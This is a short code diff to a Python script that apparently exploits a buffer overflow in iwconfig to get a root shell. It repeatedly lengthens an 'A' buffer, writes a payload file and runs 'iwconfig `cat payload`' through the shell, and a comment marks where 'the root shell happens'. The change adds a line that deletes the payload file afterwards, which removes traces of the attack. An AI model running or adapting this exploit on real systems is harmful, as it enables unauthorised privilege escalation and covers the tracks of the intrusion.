@@ -1,5 +1,6 @@
 import subprocess
 import struct
+import os
 
 buffer = b"A"
 command = ["iwconfig", buffer.decode()]
@@ -57,6 +58,7 @@ while True:
 
             iwconfig = subprocess.Popen("iwconfig `cat payload`", shell=True)
             return_code = iwconfig.wait() #the root shell happens here, because of wait()
+            os.remove("payload")
             break
     else:
         buffer += b"A"
